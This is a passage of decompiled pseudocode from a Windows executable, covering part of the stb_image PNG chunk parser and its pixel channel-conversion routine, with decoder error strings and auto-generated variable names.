              uVar4 = 0;
              if (puVar44[0xc] != 0) {
                uStackY_630 = 0x140003d18;
                FUN_140001480((longlong)puVar44);
                puVar29 = *(undefined1 **)(puVar44 + 0x30);
                *(undefined1 **)(puVar44 + 0x30) = puVar29 + 1;
                uVar4 = *puVar29;
              }
            }
            uVar9 = uVar9 + 1;
            *(undefined1 *)((longlong)puVar40 + 2) = uVar4;
            *(undefined1 *)((longlong)puVar40 + 3) = 0xff;
            puVar40 = puVar40 + 1;
          } while (uVar9 < uVar7 / 3);
        }
      }
      else if (uVar8 == 0x74524e53) {
        if (iVar11 != 0) goto LAB_1400045a8;
        if (param_1[1] != 0) {
          uStackY_630 = 0x140004ca1;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = "tRNS after IDAT";
          return (uint *)0x0;
        }
        if (local_5c2 == 0) {
          uVar8 = puVar44[2];
          if ((uVar8 & 1) == 0) {
            uStackY_630 = 0x140004cf2;
            puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar14 = "tRNS with alpha";
            return (uint *)0x0;
          }
          if (uVar8 * 2 != uVar7) {
LAB_140004c04:
            uStackY_630 = 0x140004c17;
            puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar14 = "bad tRNS len";
            return (uint *)0x0;
          }
          if (param_2 == 2) {
            puVar44[2] = uVar8 + 1;
            return (uint *)0x1;
          }
          if ((int)param_1[4] == 0x10) {
            if (0 < (int)uVar8) {
              lVar52 = 1;
              do {
                uStackY_630 = 0x1400043dd;
                iVar13 = stbi_compute_transparency((longlong)puVar44);
                uVar7 = puVar44[2];
                iVar12 = (int)lVar52;
                bVar54 = lVar52 != 3;
                asStack_550[lVar52] = (short)iVar13;
                lVar52 = lVar52 + 1;
              } while (iVar12 < (int)uVar7 && bVar54);
            }
          }
          else {
            lVar52 = 1;
            if (0 < (int)uVar8) {
              do {
                uStackY_630 = 0x140003bd2;
                iVar13 = stbi_compute_transparency((longlong)puVar44);
                uVar7 = puVar44[2];
                iVar12 = (int)lVar52;
                bVar54 = lVar52 != 3;
                (&local_558)[lVar52] = (&DAT_14002b430)[(int)param_1[4]] * (char)iVar13;
                lVar52 = lVar52 + 1;
              } while (iVar12 < (int)uVar7 && bVar54);
            }
          }
          local_5c1 = 1;
        }
        else {
          if (param_2 == 2) {
            puVar44[2] = 4;
            return (uint *)0x1;
          }
          if (uVar9 == 0) {
            uStackY_630 = 0x140004dee;
            puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar14 = "tRNS before PLTE";
            return (uint *)0x0;
          }
          if (uVar9 < uVar7) goto LAB_140004c04;
          if (uVar7 != 0) {
            puVar36 = &local_4c8;
            puVar40 = puVar36 + _Size;
            do {
              puVar29 = *(undefined1 **)(puVar44 + 0x30);
              if (puVar29 < *(undefined1 **)(puVar44 + 0x32)) {
                *(undefined1 **)(puVar44 + 0x30) = puVar29 + 1;
                uVar4 = *puVar29;
              }
              else {
                uVar4 = 0;
                if (puVar44[0xc] != 0) {
                  uStackY_630 = 0x1400046f0;
                  FUN_140001480((longlong)puVar44);
                  puVar29 = *(undefined1 **)(puVar44 + 0x30);
                  *(undefined1 **)(puVar44 + 0x30) = puVar29 + 1;
                  uVar4 = *puVar29;
                }
              }
              *(undefined1 *)((longlong)puVar36 + 3) = uVar4;
              puVar36 = puVar36 + 1;
            } while (puVar40 != puVar36);
          }
          local_5c2 = 4;
        }
      }
      else {
LAB_140003c10:
        if (iVar11 != 0) {
LAB_1400045a8:
          uStackY_630 = 0x1400045bb;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = "first not IHDR";
          return (uint *)0x0;
        }
        if ((uVar8 & 0x20000000) == 0) {
          s_XXXX_PNG_chunk_not_known_14000b0e0._0_4_ =
               uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 | uVar8 << 0x18;
          uStackY_630 = 0x140004c3a;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = s_XXXX_PNG_chunk_not_known_14000b0e0;
          return (uint *)0x0;
        }
        uStackY_630 = 0x140003c2e;
        stbi_compute_huffman_codes((longlong)puVar44,uVar7);
      }
    }
    uStackY_630 = 0x140003b35;
    stbi_defilter_row((longlong)puVar44);
    uVar30 = uVar35;
  } while( true );
}



/* FUN_140004ef0 @ 140004ef0 */

uint * FUN_140004ef0(uint *param_1,uint *param_2,uint *param_3,uint *param_4,uint param_5,
                    int *param_6)

{
  byte *pbVar1;
  byte bVar2;
  uint uVar3;
  uint uVar4;
  char *pcVar5;
  uint uVar6;
  uint *_Memory;
  char cVar7;
  int iVar8;
  int iVar9;
  undefined8 *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint *puVar13;
  uint uVar14;
  ulonglong uVar15;
  uint *puVar16;
  uint *puVar17;
  uint *puVar18;
  uint uVar19;
  uint uVar20;
  int iVar21;
  int iVar22;
  char *pcVar23;
  longlong lVar24;
  undefined1 extraout_XMM0 [16];
  undefined1 auVar25 [16];
  undefined1 in_XMM1 [16];
  uint *local_78;
  void *local_70;
  void *local_68;
  uint *local_60;
  int local_58;
  
  pcVar23 = &DAT_14002b428;
  param_6[1] = 0;
  param_6[2] = 0;
  *param_6 = 8;
  do {
    pcVar5 = *(char **)(param_1 + 0x30);
    if (pcVar5 < *(char **)(param_1 + 0x32)) {
      *(char **)(param_1 + 0x30) = pcVar5 + 1;
      cVar7 = *pcVar5;
LAB_140004f72:
      if (*pcVar23 != cVar7) {
LAB_140004f78:
        puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *(undefined8 *)(param_1 + 0x30) = *(undefined8 *)(param_1 + 0x34);
        *(undefined8 *)(param_1 + 0x32) = *(undefined8 *)(param_1 + 0x36);
        *puVar10 = "unknown image type";
        return (uint *)0x0;
      }
    }
    else {
      if (param_1[0xc] != 0) {
        FUN_140001480((longlong)param_1);
        pcVar5 = *(char **)(param_1 + 0x30);
        *(char **)(param_1 + 0x30) = pcVar5 + 1;
        cVar7 = *pcVar5;
        goto LAB_140004f72;
      }
      if (*pcVar23 != '\0') goto LAB_140004f78;
    }
    pcVar23 = pcVar23 + 1;
  } while (pcVar23 != "");
  *(undefined8 *)(param_1 + 0x30) = *(undefined8 *)(param_1 + 0x34);
  *(undefined8 *)(param_1 + 0x32) = *(undefined8 *)(param_1 + 0x36);
  if (4 < param_5) {
LAB_1400050f8:
    puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar10 = "bad req_comp";
    return (uint *)0x0;
  }
  local_60 = (uint *)0x0;
  local_78 = param_1;
  puVar11 = FUN_140003920((longlong *)&local_78,0,param_5);
  _Memory = local_60;
  puVar13 = local_78;
  if ((int)puVar11 == 0) {
    puVar11 = (uint *)0x0;
    puVar13 = local_60;
  }
  else {
    if (local_58 < 9) {
      local_58 = 8;
    }
    else if (local_58 != 0x10) goto LAB_140005238;
    *param_6 = local_58;
    puVar11 = local_60;
    if ((param_5 != 0) && (uVar14 = local_78[3], param_5 != uVar14)) {
      uVar3 = local_78[1];
      uVar4 = *local_78;
      if (local_58 == 8) {
        puVar11 = (uint *)stbi_create_png_image(param_5,uVar4,uVar3);
        if (puVar11 == (uint *)0x0) goto LAB_140005855;
        if (0 < (int)uVar3) {
          iVar8 = uVar14 * uVar4;
          iVar9 = param_5 * uVar4;
          switch((param_5 - 10) + uVar14 * 8) {
          case 0:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                iVar22 = (int)puVar16;
                do {
                  uVar6 = *puVar16;
                  puVar16 = (uint *)((longlong)puVar16 + 1);
                  *(byte *)((longlong)puVar12 + 1) = 0xff;
                  *(byte *)puVar12 = (byte)uVar6;
                  puVar12 = (uint *)((longlong)puVar12 + 2);
                } while (-1 < (int)(((uVar4 - 1) + iVar22) - (int)puVar16));
              }
              uVar14 = uVar14 + 1;
              uVar19 = uVar19 + iVar8;
              uVar20 = uVar20 + iVar9;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 1:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                iVar22 = (int)puVar16;
                do {
                  bVar2 = (byte)*puVar16;
                  puVar16 = (uint *)((longlong)puVar16 + 1);
                  *(byte *)((longlong)puVar12 + 2) = bVar2;
                  *(ushort *)puVar12 = CONCAT11(bVar2,bVar2);
                  puVar12 = (uint *)((longlong)puVar12 + 3);
                } while (-1 < (int)(((uVar4 - 1) + iVar22) - (int)puVar16));
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 2:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = puVar11;
            puVar12 = _Memory;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                iVar22 = (int)puVar12;
                do {
                  bVar2 = (byte)*puVar12;
                  puVar12 = (uint *)((longlong)puVar12 + 1);
                  *(byte *)((longlong)puVar16 + 3) = 0xff;
                  *(byte *)((longlong)puVar16 + 2) = bVar2;
                  *(ushort *)puVar16 = CONCAT11(bVar2,bVar2);
                  puVar16 = puVar16 + 1;
                } while (-1 < (int)(((uVar4 - 1) + iVar22) - (int)puVar12));
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar12 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar16 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          default:
            _assert(&DAT_14002b2bc,"stb_image.h",0x6fe);
LAB_140005238:
            puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar10 = "bad bits_per_channel";
            return (uint *)0x0;
          case 7:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                lVar24 = 0;
                do {
                  *(byte *)((longlong)puVar12 + lVar24) =
                       (byte)*(ushort *)((longlong)puVar16 + lVar24 * 2);
                  lVar24 = lVar24 + 1;
                } while (-1 < (int)((uVar4 - 1) - (int)lVar24));
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 9:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = puVar11;
            puVar12 = _Memory;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  bVar2 = (byte)*puVar12;
                  iVar22 = iVar22 + -1;
                  puVar12 = (uint *)((longlong)puVar12 + 2);
                  *(byte *)((longlong)puVar16 + 2) = bVar2;
                  *(ushort *)puVar16 = CONCAT11(bVar2,bVar2);
                  puVar16 = (uint *)((longlong)puVar16 + 3);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar12 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar16 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 10:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                lVar24 = 0;
                do {
                  bVar2 = (byte)*(ushort *)((longlong)puVar16 + lVar24 * 2);
                  puVar12[lVar24] =
                       CONCAT31(CONCAT21(CONCAT11(*(byte *)((longlong)puVar16 + lVar24 * 2 + 1),
                                                  bVar2),bVar2),bVar2);
                  lVar24 = lVar24 + 1;
                } while (-1 < (int)((uVar4 - 1) - (int)lVar24));
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 0xf:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                puVar17 = puVar12;
                do {
                  puVar18 = (uint *)((longlong)puVar17 + 1);
                  *(byte *)puVar17 =
                       (byte)((uint)(byte)*puVar16 * 0x4d +
                              (uint)*(byte *)((longlong)puVar16 + 1) * 0x96 +
                              (uint)*(byte *)((longlong)puVar16 + 2) * 0x1d >> 8);
                  puVar16 = (uint *)((longlong)puVar16 + 3);
                  puVar17 = puVar18;
                } while (-1 < (int)(((uVar4 - 1) + (int)puVar12) - (int)puVar18));
              }
              uVar14 = uVar14 + 1;
              uVar19 = uVar19 + iVar8;
              uVar20 = uVar20 + iVar9;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 0x10:
            uVar14 = 0;
            uVar20 = 0;
            uVar19 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar22 = iVar22 + -1;
                  *(byte *)puVar12 =
                       (byte)((uint)(byte)*puVar16 * 0x4d +
                              (uint)*(byte *)((longlong)puVar16 + 1) * 0x96 +
                              (uint)*(byte *)((longlong)puVar16 + 2) * 0x1d >> 8);
                  *(byte *)((longlong)puVar12 + 1) = 0xff;
                  puVar16 = (uint *)((longlong)puVar16 + 3);
                  puVar12 = (uint *)((longlong)puVar12 + 2);
                } while (iVar22 != -1);
              }
              uVar19 = uVar19 + 1;
              uVar20 = uVar20 + iVar8;
              uVar14 = uVar14 + iVar9;
              if (uVar3 == uVar19) break;
              puVar16 = (uint *)((ulonglong)uVar20 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar14 + (longlong)puVar11);
            }
            break;
          case 0x12:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = puVar11;
            puVar12 = _Memory;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  uVar6 = *puVar12;
                  iVar22 = iVar22 + -1;
                  *(byte *)((longlong)puVar16 + 3) = 0xff;
                  *(ushort *)puVar16 = (ushort)uVar6;
                  *(byte *)((longlong)puVar16 + 2) = *(byte *)((longlong)puVar12 + 2);
                  puVar16 = puVar16 + 1;
                  puVar12 = (uint *)((longlong)puVar12 + 3);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar12 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar16 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 0x17:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                puVar17 = puVar12;
                do {
                  puVar18 = (uint *)((longlong)puVar17 + 1);
                  *(byte *)puVar17 =
                       (byte)((uint)(byte)*puVar16 * 0x4d +
                              (uint)*(byte *)((longlong)puVar16 + 1) * 0x96 +
                              (uint)*(byte *)((longlong)puVar16 + 2) * 0x1d >> 8);
                  puVar16 = puVar16 + 1;
                  puVar17 = puVar18;
                } while (-1 < (int)(((uVar4 - 1) + (int)puVar12) - (int)puVar18));
              }
              uVar14 = uVar14 + 1;
              uVar19 = uVar19 + iVar8;
              uVar20 = uVar20 + iVar9;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
            break;
          case 0x18:
            uVar14 = 0;
            uVar20 = 0;
            uVar19 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar22 = iVar22 + -1;
                  *(byte *)puVar12 =
                       (byte)((uint)(byte)*puVar16 * 0x4d +
                              (uint)*(byte *)((longlong)puVar16 + 1) * 0x96 +
                              (uint)*(byte *)((longlong)puVar16 + 2) * 0x1d >> 8);
                  *(byte *)((longlong)puVar12 + 1) = *(byte *)((longlong)puVar16 + 3);
                  puVar16 = puVar16 + 1;
                  puVar12 = (uint *)((longlong)puVar12 + 2);
                } while (iVar22 != -1);
              }
              uVar19 = uVar19 + 1;
              uVar20 = uVar20 + iVar8;
              uVar14 = uVar14 + iVar9;
              if (uVar3 == uVar19) break;
              puVar16 = (uint *)((ulonglong)uVar20 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar14 + (longlong)puVar11);
            }
            break;
          case 0x19:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar22 = iVar22 + -1;
                  *(ushort *)puVar12 = (ushort)*puVar16;
                  *(byte *)((longlong)puVar12 + 2) = *(byte *)((longlong)puVar16 + 2);
                  puVar16 = puVar16 + 1;
                  puVar12 = (uint *)((longlong)puVar12 + 3);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((ulonglong)uVar19 + (longlong)_Memory);
              puVar12 = (uint *)((ulonglong)uVar20 + (longlong)puVar11);
            }
          }
        }
        free(_Memory);
        puVar13[3] = param_5;
      }
      else {
        puVar11 = (uint *)malloc((ulonglong)(uVar3 * uVar4 * param_5 * 2));
        if (puVar11 == (uint *)0x0) {
LAB_140005855:
          free(_Memory);
          puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar10 = "outofmem";
          puVar13[3] = param_5;
          return (uint *)0x0;
        }
        if (0 < (int)uVar3) {
          iVar8 = uVar14 * uVar4;
          iVar9 = param_5 * uVar4;
          switch((param_5 - 10) + uVar14 * 8) {
          case 0:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar12 = puVar11;
            puVar16 = _Memory;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                lVar24 = 0;
                do {
                  *(ushort *)(puVar12 + lVar24) = *(ushort *)((longlong)puVar16 + lVar24 * 2);
                  pbVar1 = (byte *)((longlong)puVar12 + lVar24 * 4 + 2);
                  pbVar1[0] = 0xff;
                  pbVar1[1] = 0xff;
                  lVar24 = lVar24 + 1;
                } while (-1 < (int)((uVar4 - 1) - (int)lVar24));
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar14 == uVar3) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 1:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar12 = puVar11;
            puVar16 = _Memory;
            auVar25 = extraout_XMM0;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  uVar6 = *puVar16;
                  iVar22 = iVar22 + -1;
                  puVar16 = (uint *)((longlong)puVar16 + 2);
                  *(ushort *)(puVar12 + 1) = (ushort)uVar6;
                  auVar25 = pshuflw(auVar25,ZEXT216((ushort)uVar6),0);
                  *puVar12 = auVar25._0_4_;
                  puVar12 = (uint *)((longlong)puVar12 + 6);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar14 == uVar3) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 2:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar12 = puVar11;
            puVar16 = _Memory;
            auVar25 = extraout_XMM0;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  uVar6 = *puVar16;
                  iVar22 = iVar22 + -1;
                  puVar16 = (uint *)((longlong)puVar16 + 2);
                  *(ushort *)(puVar12 + 1) = (ushort)uVar6;
                  auVar25 = pshuflw(auVar25,ZEXT216((ushort)uVar6),0);
                  *(ushort *)((longlong)puVar12 + 6) = 0xffff;
                  *puVar12 = auVar25._0_4_;
                  puVar12 = puVar12 + 2;
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar14 == uVar3) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          default:
            _assert(&DAT_14002b2bc,"stb_image.h",0x737);
            goto LAB_1400050f8;
          case 7:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                lVar24 = 0;
                do {
                  *(ushort *)((longlong)puVar12 + lVar24 * 2) = (ushort)puVar16[lVar24];
                  lVar24 = lVar24 + 1;
                } while (-1 < (int)((uVar4 - 1) - (int)lVar24));
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 9:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar12 = puVar11;
            puVar16 = _Memory;
            auVar25 = extraout_XMM0;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  uVar6 = *puVar16;
                  iVar22 = iVar22 + -1;
                  puVar16 = puVar16 + 1;
                  *(ushort *)(puVar12 + 1) = (ushort)uVar6;
                  auVar25 = pshuflw(auVar25,ZEXT216((ushort)uVar6),0);
                  *puVar12 = auVar25._0_4_;
                  puVar12 = (uint *)((longlong)puVar12 + 6);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar14 == uVar3) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 10:
            uVar15 = 1;
            if (SCARRY4(uVar4 - 2,1) == (int)(uVar4 - 1) < 0) {
              uVar15 = (ulonglong)uVar4;
            }
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar12 = puVar11;
            puVar16 = _Memory;
            while( true ) {
              if (-1 < (int)(uVar4 - 1)) {
                lVar24 = 0;
                do {
                  in_XMM1 = pshuflw(in_XMM1,ZEXT416(*(uint *)((longlong)puVar16 + lVar24)),0xe0);
                  *(uint *)((longlong)puVar12 + lVar24 * 2 + 4) =
                       *(uint *)((longlong)puVar16 + lVar24);
                  *(int *)((longlong)puVar12 + lVar24 * 2) = in_XMM1._0_4_;
                  lVar24 = lVar24 + 4;
                } while (lVar24 != uVar15 * 4);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 0xf:
            uVar19 = 0;
            uVar14 = 0;
            iVar22 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar21 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar21 = iVar21 + -1;
                  *(ushort *)puVar12 =
                       (ushort)((uint)(ushort)*puVar16 * 0x4d +
                                (uint)*(ushort *)((longlong)puVar16 + 2) * 0x96 +
                                (uint)(ushort)puVar16[1] * 0x1d >> 8);
                  puVar16 = (uint *)((longlong)puVar16 + 6);
                  puVar12 = (uint *)((longlong)puVar12 + 2);
                } while (iVar21 != -1);
              }
              if (iVar22 + 1U == uVar3) break;
              uVar19 = uVar19 + iVar9;
              uVar14 = uVar14 + iVar8;
              iVar22 = iVar22 + 1;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar14 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar19 * 2);
            }
            break;
          case 0x10:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar22 = iVar22 + -1;
                  *(ushort *)puVar12 =
                       (ushort)((uint)(ushort)*puVar16 * 0x4d +
                                (uint)*(ushort *)((longlong)puVar16 + 2) * 0x96 +
                                (uint)(ushort)puVar16[1] * 0x1d >> 8);
                  *(ushort *)((longlong)puVar12 + 2) = 0xffff;
                  puVar16 = (uint *)((longlong)puVar16 + 6);
                  puVar12 = puVar12 + 1;
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar19 = uVar19 + iVar8;
              uVar20 = uVar20 + iVar9;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 0x12:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar12 = puVar11;
            puVar16 = _Memory;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar22 = iVar22 + -1;
                  *puVar12 = *puVar16;
                  *(ushort *)(puVar12 + 1) = (ushort)puVar16[1];
                  *(ushort *)((longlong)puVar12 + 6) = 0xffff;
                  puVar12 = puVar12 + 2;
                  puVar16 = (uint *)((longlong)puVar16 + 6);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar14 == uVar3) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 0x17:
            uVar20 = 0;
            uVar19 = 0;
            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar22 = iVar22 + -1;
                  *(ushort *)puVar12 =
                       (ushort)((uint)(ushort)*puVar16 * 0x4d +
                                (uint)*(ushort *)((longlong)puVar16 + 2) * 0x96 +
                                (uint)(ushort)puVar16[1] * 0x1d >> 8);
                  puVar16 = puVar16 + 2;
                  puVar12 = (uint *)((longlong)puVar12 + 2);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar19 = uVar19 + iVar8;
              uVar20 = uVar20 + iVar9;
              if (uVar14 == uVar3) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
            break;
          case 0x18:
            uVar19 = 0;
            uVar14 = 0;
            iVar22 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar21 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar21 = iVar21 + -1;
                  *puVar12 = (uint)*(ushort *)((longlong)puVar16 + 6) << 0x10 |
                             (int)((uint)(ushort)*puVar16 * 0x4d +
                                   (uint)*(ushort *)((longlong)puVar16 + 2) * 0x96 +
                                  (uint)(ushort)puVar16[1] * 0x1d) >> 8 & 0xffffU;
                  puVar16 = puVar16 + 2;
                  puVar12 = puVar12 + 1;
                } while (iVar21 != -1);
              }
              if (uVar3 == iVar22 + 1U) break;
              iVar22 = iVar22 + 1;
              uVar14 = uVar14 + iVar8;
              uVar19 = uVar19 + iVar9;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar14 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar19 * 2);
            }
            break;
          case 0x19:
            uVar20 = 0;
            uVar19 = 0;
